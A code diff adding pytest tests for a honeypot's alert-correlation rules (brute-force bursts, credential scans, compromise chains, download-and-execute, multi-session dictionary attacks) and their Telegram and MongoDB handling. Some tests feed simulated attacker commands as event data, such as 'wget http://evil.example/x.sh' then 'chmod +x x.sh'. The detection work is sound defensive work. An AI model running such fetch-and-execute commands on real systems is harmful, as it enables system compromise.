@@ -396,6 +396,285 @@ class TestRealtimeAlertRouting:
 
 
 # ---------------------------------------------------------------------------
+# AL-16..AL-21: notifier/correlation.py - cross-event correlation rules
+# ---------------------------------------------------------------------------
+class TestCorrelation:
+    def test_al16_threshold_rule_fires_only_once_threshold_is_reached(self, fresh_module):
+        """brute_force_burst needs 5 cowrie.login.failed from one src_ip
+        within its window - same username on every event so the
+        credential_scan aggregation rule (distinct usernames) never fires
+        alongside it and muddies the assertion."""
+        correlation = fresh_module("correlation")
+        state = correlation.CorrelationState()
+
+        fired_rule_ids = []
+        for _ in range(4):
+            event = make_login_failed_event(src_ip="203.0.113.7", username="root")
+            fired_rule_ids += [a.rule_id for a in correlation.evaluate_event(event, state)]
+        assert "brute_force_burst" not in fired_rule_ids, "must not fire before the 5th event"
+
+        fifth = make_login_failed_event(src_ip="203.0.113.7", username="root")
+        fired = correlation.evaluate_event(fifth, state)
+
+        assert [a.rule_id for a in fired] == ["brute_force_burst"]
+        assert fired[0].group_key == "203.0.113.7"
+        assert len(fired[0].matched_events) == 5
+
+    def test_al17_sequence_rule_fires_only_after_every_step_is_observed(self, fresh_module):
+        correlation = fresh_module("correlation")
+        state = correlation.CorrelationState()
+
+        fired = correlation.evaluate_event(make_login_failed_event(src_ip="198.51.100.9"), state)
+        assert all(a.rule_id != "compromise_chain" for a in fired)
+
+        fired = correlation.evaluate_event(make_login_success_event(src_ip="198.51.100.9"), state)
+        assert all(a.rule_id != "compromise_chain" for a in fired)
+
+        fired = correlation.evaluate_event(
+            make_command_event(src_ip="198.51.100.9", command="wget http://evil/x"), state
+        )
+
+        assert [a.rule_id for a in fired] == ["compromise_chain"]
+        assert fired[0].group_key == "198.51.100.9"
+
+    def test_al18_aggregation_rule_needs_distinct_values_not_just_event_count(self, fresh_module):
+        """4 login.failed attempts that all repeat the SAME username must
+        not fire credential_scan (needs >=4 DISTINCT usernames, not just 4
+        events) - only once a 4th genuinely different username shows up
+        (after 2 other distinct ones) does it fire."""
+        correlation = fresh_module("correlation")
+        state = correlation.CorrelationState()
+
+        fired_rule_ids = []
+        for _ in range(4):
+            event = make_login_failed_event(src_ip="203.0.113.7", username="admin")
+            fired_rule_ids += [a.rule_id for a in correlation.evaluate_event(event, state)]
+        assert "credential_scan" not in fired_rule_ids, "1 distinct username repeated 4x must not fire"
+
+        for username in ["root", "guest"]:
+            event = make_login_failed_event(src_ip="203.0.113.7", username=username)
+            fired_rule_ids += [a.rule_id for a in correlation.evaluate_event(event, state)]
+        assert "credential_scan" not in fired_rule_ids, "still only 3 distinct usernames so far"
+
+        fired = correlation.evaluate_event(
+            make_login_failed_event(src_ip="203.0.113.7", username="ubnt"), state
+        )
+
+        assert [a.rule_id for a in fired] == ["credential_scan"], "4th distinct username must fire it"
+
+    def test_al19_cooldown_prevents_the_same_rule_group_from_refiring(self, fresh_module, monkeypatch):
+        correlation = fresh_module("correlation")
+        state = correlation.CorrelationState()
+        fake_now = [1_000_000.0]
+        monkeypatch.setattr(correlation.time, "time", lambda: fake_now[0])
+
+        for _ in range(5):
+            correlation.evaluate_event(make_login_failed_event(src_ip="203.0.113.7"), state)
+
+        # Still well inside CORRELATION_COOLDOWN_SECONDS of the first fire -
+        # a fresh burst of 5 more must not fire brute_force_burst again.
+        fake_now[0] += 10
+        fired = []
+        for _ in range(5):
+            fired += correlation.evaluate_event(make_login_failed_event(src_ip="203.0.113.7"), state)
+        assert fired == []
+
+        fake_now[0] += correlation.CORRELATION_COOLDOWN_SECONDS + 1
+        fired = []
+        for _ in range(5):
+            fired += correlation.evaluate_event(make_login_failed_event(src_ip="203.0.113.7"), state)
+
+        assert [a.rule_id for a in fired] == ["brute_force_burst"]
+
+    def test_al19b_cooldown_is_per_group_key_not_global(self, fresh_module):
+        """One IP's cooldown must not silence the same rule firing for a
+        different IP - same reasoning as realtime_alert.py's
+        _should_alert() cooldown being keyed by (ip, alert_type)."""
+        correlation = fresh_module("correlation")
+        state = correlation.CorrelationState()
+
+        for _ in range(5):
+            correlation.evaluate_event(make_login_failed_event(src_ip="203.0.113.7"), state)
+
+        fired = []
+        for _ in range(5):
+            fired += correlation.evaluate_event(make_login_failed_event(src_ip="198.51.100.9"), state)
+
+        assert [a.rule_id for a in fired] == ["brute_force_burst"]
+
+    def test_al20_event_missing_the_group_by_field_is_skipped_not_errored(self, fresh_module):
+        correlation = fresh_module("correlation")
+        state = correlation.CorrelationState()
+
+        fired = correlation.evaluate_event({"eventid": "cowrie.login.failed"}, state)
+
+        assert fired == []
+
+    def test_al21_realtime_alert_sends_a_telegram_message_when_a_rule_fires(
+        self, fresh_module, monkeypatch
+    ):
+        realtime_alert = fresh_module("realtime_alert")
+        for name in ("alert_login_failed", "alert_login_success", "alert_session_commands"):
+            monkeypatch.setattr(realtime_alert, name, Mock())
+        mock_send = Mock()
+        monkeypatch.setattr(realtime_alert, "send_message", mock_send)
+        before = realtime_alert.notify_metrics.TELEGRAM_ALERTS_SENT.labels(
+            "correlation.brute_force_burst"
+        )._value.get()
+
+        for _ in range(5):
+            realtime_alert.process_event(
+                make_login_failed_event(src_ip="203.0.113.7", username="root")
+            )
+
+        correlation_calls = [c for c in mock_send.call_args_list if "[correlation:" in c.args[0]]
+        assert len(correlation_calls) == 1
+        assert correlation_calls[0].args[0] == "[correlation:medium] 203.0.113.7: 5 failed logins in 60s"
+        after = realtime_alert.notify_metrics.TELEGRAM_ALERTS_SENT.labels(
+            "correlation.brute_force_burst"
+        )._value.get()
+        assert after == before + 1
+
+    def test_al21c_a_fired_correlation_rule_is_persisted_before_the_telegram_send(
+        self, fresh_module, monkeypatch
+    ):
+        """Mirrors the siem-dashboard reference's Alert.create_from_rule():
+        the fired alert is written to its own MongoDB collection (not the
+        attacks collection - it isn't a single Cowrie event) before the
+        Telegram push, so there's a durable record even if send_message
+        then fails."""
+        realtime_alert = fresh_module("realtime_alert")
+        for name in ("alert_login_failed", "alert_login_success", "alert_session_commands"):
+            monkeypatch.setattr(realtime_alert, name, Mock())
+        monkeypatch.setattr(realtime_alert, "send_message", Mock())
+
+        for _ in range(5):
+            realtime_alert.process_event(
+                make_login_failed_event(src_ip="203.0.113.7", username="root")
+            )
+
+        saved = realtime_alert.correlation_alerts_collection.find_one(
+            {"rule_id": "brute_force_burst", "group_key": "203.0.113.7"}
+        )
+        assert saved is not None
+        assert saved["severity"] == "medium"
+        assert saved["matched_event_count"] == 5
+
+    def test_al21d_a_correlation_mongo_insert_failure_skips_the_telegram_send_too(
+        self, fresh_module, monkeypatch
+    ):
+        """Same all-or-nothing choice as the main attacks-collection insert
+        (see process_event's own try/except) - don't push a Telegram alert
+        for something that has no durable record behind it."""
+        realtime_alert = fresh_module("realtime_alert")
+        for name in ("alert_login_failed", "alert_login_success", "alert_session_commands"):
+            monkeypatch.setattr(realtime_alert, name, Mock())
+        mock_send = Mock()
+        monkeypatch.setattr(realtime_alert, "send_message", mock_send)
+        monkeypatch.setattr(
+            realtime_alert.correlation_alerts_collection,
+            "insert_one",
+            Mock(side_effect=Exception("mongo down")),
+        )
+        before = realtime_alert.notify_metrics.CORRELATION_ALERT_INSERT_ERRORS._value.get()
+
+        for _ in range(5):
+            realtime_alert.process_event(
+                make_login_failed_event(src_ip="203.0.113.7", username="root")
+            )
+
+        correlation_calls = [c for c in mock_send.call_args_list if "[correlation:" in c.args[0]]
+        assert correlation_calls == []
+        after = realtime_alert.notify_metrics.CORRELATION_ALERT_INSERT_ERRORS._value.get()
+        assert after == before + 1
+
+    def test_al21b_correlation_alerts_are_not_gated_by_the_per_event_should_alert_cooldown(
+        self, fresh_module, monkeypatch
+    ):
+        """realtime_alert.py's own _should_alert() cooldown (keyed on
+        (ip, alert_type)) must not swallow a correlation alert - the two
+        cooldowns are intentionally independent (see the comment on
+        _CORRELATION_STATE in realtime_alert.py)."""
+        realtime_alert = fresh_module("realtime_alert")
+        monkeypatch.setattr(realtime_alert, "alert_login_failed", Mock())
+        mock_send = Mock()
+        monkeypatch.setattr(realtime_alert, "send_message", mock_send)
+
+        # Burn the login_failed _should_alert cooldown on the very first event.
+        realtime_alert.process_event(make_login_failed_event(src_ip="203.0.113.7", username="root"))
+        assert realtime_alert._should_alert("203.0.113.7", "login_failed") is False
+
+        for _ in range(4):
+            realtime_alert.process_event(
+                make_login_failed_event(src_ip="203.0.113.7", username="root")
+            )
+
+        correlation_calls = [c for c in mock_send.call_args_list if "[correlation:" in c.args[0]]
+        assert len(correlation_calls) == 1
+
+    def test_al22_download_and_execute_fires_on_wget_then_chmod(self, fresh_module):
+        correlation = fresh_module("correlation")
+        state = correlation.CorrelationState()
+
+        fired = correlation.evaluate_event(
+            make_command_event(src_ip="203.0.113.7", command="wget http://evil.example/x.sh"), state
+        )
+        assert all(a.rule_id != "download_and_execute" for a in fired)
+
+        fired = correlation.evaluate_event(
+            make_command_event(src_ip="203.0.113.7", command="chmod +x x.sh"), state
+        )
+
+        assert [a.rule_id for a in fired] == ["download_and_execute"]
+        assert fired[0].severity == "critical"
+
+    def test_al22b_download_and_execute_does_not_fire_on_download_alone(self, fresh_module):
+        """An IP that only downloads (no chmod/execute step observed) must
+        not fire - the whole point is catching the STAGING step, not just
+        a wget, which recon-only bots run too without ever executing it."""
+        correlation = fresh_module("correlation")
+        state = correlation.CorrelationState()
+
+        fired = []
+        for command in ["wget http://evil.example/x.sh", "whoami", "ls -la"]:
+            fired += correlation.evaluate_event(
+                make_command_event(src_ip="203.0.113.7", command=command), state
+            )
+
+        assert all(a.rule_id != "download_and_execute" for a in fired)
+
+    def test_al23_dictionary_attack_multi_session_counts_distinct_sessions(self, fresh_module):
+        """3 failed logins in 3 SEPARATE sessions must fire - unlike
+        credential_scan (distinct usernames) or brute_force_burst (raw
+        event count), this rule cares about reconnect behavior."""
+        correlation = fresh_module("correlation")
+        state = correlation.CorrelationState()
+
+        fired_rule_ids = []
+        for session in ["sessA", "sessB"]:
+            event = make_login_failed_event(src_ip="203.0.113.7", session=session, username="root")
+            fired_rule_ids += [a.rule_id for a in correlation.evaluate_event(event, state)]
+        assert "dictionary_attack_multi_session" not in fired_rule_ids
+
+        fired = correlation.evaluate_event(
+            make_login_failed_event(src_ip="203.0.113.7", session="sessC", username="root"), state
+        )
+
+        assert "dictionary_attack_multi_session" in [a.rule_id for a in fired]
+
+    def test_al23b_dictionary_attack_multi_session_ignores_repeats_in_one_session(self, fresh_module):
+        correlation = fresh_module("correlation")
+        state = correlation.CorrelationState()
+
+        fired_rule_ids = []
+        for _ in range(5):
+            event = make_login_failed_event(src_ip="203.0.113.7", session="sessA", username="root")
+            fired_rule_ids += [a.rule_id for a in correlation.evaluate_event(event, state)]
+
+        assert "dictionary_attack_multi_session" not in fired_rule_ids
+
+
+# ---------------------------------------------------------------------------
 # AL-09: notifier/daily_report.py fallback to sample_log.json
 # ---------------------------------------------------------------------------
 class TestDailyReportFallback:
